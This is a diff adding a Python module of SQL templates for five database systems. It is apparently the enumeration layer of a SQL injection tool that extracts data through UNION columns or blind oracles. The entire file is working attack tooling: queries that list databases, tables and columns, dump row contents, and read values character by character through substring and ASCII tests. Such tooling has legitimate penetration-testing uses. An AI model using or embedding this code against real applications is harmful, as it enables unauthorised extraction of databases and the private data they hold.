@@ -1,0 +1,91 @@
+"""Per-DBMS SQL used for enumeration. Each returns a scalar subquery string
+that the extractor fetches (via UNION visible column or a blind oracle)."""
+
+# Each dialect exposes callables returning a scalar SQL expression.
+# {i} = row offset for LIMIT-based iteration.
+
+DIALECTS = {
+    "MySQL": {
+        "substr": "SUBSTRING(({e}),{p},1)",
+        "ascii": "ASCII({c})",
+        "length": "LENGTH(({e}))",
+        "version": "VERSION()",
+        "current_db": "DATABASE()",
+        "current_user": "CURRENT_USER()",
+        "count_dbs": "(SELECT COUNT(*) FROM information_schema.schemata)",
+        "db_at": "(SELECT schema_name FROM information_schema.schemata LIMIT {i},1)",
+        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={db})",
+        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema={db} LIMIT {i},1)",
+        "count_cols": "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name={tbl} AND table_schema={db})",
+        "col_at": "(SELECT column_name FROM information_schema.columns WHERE table_name={tbl} AND table_schema={db} LIMIT {i},1)",
+        "count_rows": "(SELECT COUNT(*) FROM {tbl})",
+        "cell": "(SELECT {col} FROM {tbl} LIMIT {i},1)",
+        "quote": lambda s: "0x" + s.encode().hex(),
+    },
+    "PostgreSQL": {
+        "substr": "SUBSTRING(({e}) FROM {p} FOR 1)",
+        "ascii": "ASCII({c})",
+        "length": "LENGTH(({e}))",
+        "version": "VERSION()",
+        "current_db": "CURRENT_DATABASE()",
+        "current_user": "CURRENT_USER",
+        "count_dbs": "(SELECT COUNT(*) FROM pg_database)",
+        "db_at": "(SELECT datname FROM pg_database ORDER BY datname OFFSET {i} LIMIT 1)",
+        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name OFFSET {i} LIMIT 1)",
+        "count_cols": "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name={tbl})",
+        "col_at": "(SELECT column_name FROM information_schema.columns WHERE table_name={tbl} ORDER BY column_name OFFSET {i} LIMIT 1)",
+        "count_rows": "(SELECT COUNT(*) FROM {tbl})",
+        "cell": "(SELECT {col} FROM {tbl} OFFSET {i} LIMIT 1)",
+        "quote": lambda s: "'" + s.replace("'", "''") + "'",
+    },
+    "Microsoft SQL Server": {
+        "substr": "SUBSTRING(({e}),{p},1)",
+        "ascii": "UNICODE({c})",
+        "length": "LEN(({e}))",
+        "version": "@@VERSION",
+        "current_db": "DB_NAME()",
+        "current_user": "SYSTEM_USER",
+        "count_tables": "(SELECT COUNT(*) FROM information_schema.tables)",
+        "table_at": "(SELECT name FROM sys.tables ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)",
+        "count_cols": "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name={tbl})",
+        "col_at": "(SELECT column_name FROM information_schema.columns WHERE table_name={tbl} ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)",
+        "count_rows": "(SELECT COUNT(*) FROM {tbl})",
+        "cell": "(SELECT {col} FROM {tbl} ORDER BY 1 OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)",
+        "quote": lambda s: "'" + s.replace("'", "''") + "'",
+    },
+    "SQLite": {
+        "substr": "SUBSTR(({e}),{p},1)",
+        "ascii": "UNICODE({c})",
+        "length": "LENGTH(({e}))",
+        "version": "sqlite_version()",
+        "current_db": "'main'",
+        "current_user": "'(sqlite)'",
+        "count_tables": "(SELECT COUNT(*) FROM sqlite_master WHERE type='table')",
+        "table_at": "(SELECT name FROM sqlite_master WHERE type='table' LIMIT {i},1)",
+        "count_cols": "(SELECT COUNT(*) FROM pragma_table_info({tbl}))",
+        "col_at": "(SELECT name FROM pragma_table_info({tbl}) LIMIT {i},1)",
+        "count_rows": "(SELECT COUNT(*) FROM {tbl})",
+        "cell": "(SELECT {col} FROM {tbl} LIMIT {i},1)",
+        "quote": lambda s: "'" + s.replace("'", "''") + "'",
+    },
+    "Oracle": {
+        "substr": "SUBSTR(({e}),{p},1)",
+        "ascii": "ASCII({c})",
+        "length": "LENGTH(({e}))",
+        "version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
+        "current_db": "(SELECT global_name FROM global_name)",
+        "current_user": "USER",
+        "count_tables": "(SELECT COUNT(*) FROM all_tables)",
+        "table_at": "(SELECT table_name FROM (SELECT table_name, ROWNUM rn FROM all_tables) WHERE rn={i1})",
+        "count_cols": "(SELECT COUNT(*) FROM all_tab_columns WHERE table_name={tbl})",
+        "col_at": "(SELECT column_name FROM (SELECT column_name, ROWNUM rn FROM all_tab_columns WHERE table_name={tbl}) WHERE rn={i1})",
+        "count_rows": "(SELECT COUNT(*) FROM {tbl})",
+        "cell": "(SELECT {col} FROM (SELECT {col}, ROWNUM rn FROM {tbl}) WHERE rn={i1})",
+        "quote": lambda s: "'" + s.replace("'", "''") + "'",
+    },
+}
+
+
+def get(dbms):
+    return DIALECTS.get(dbms, DIALECTS["MySQL"])
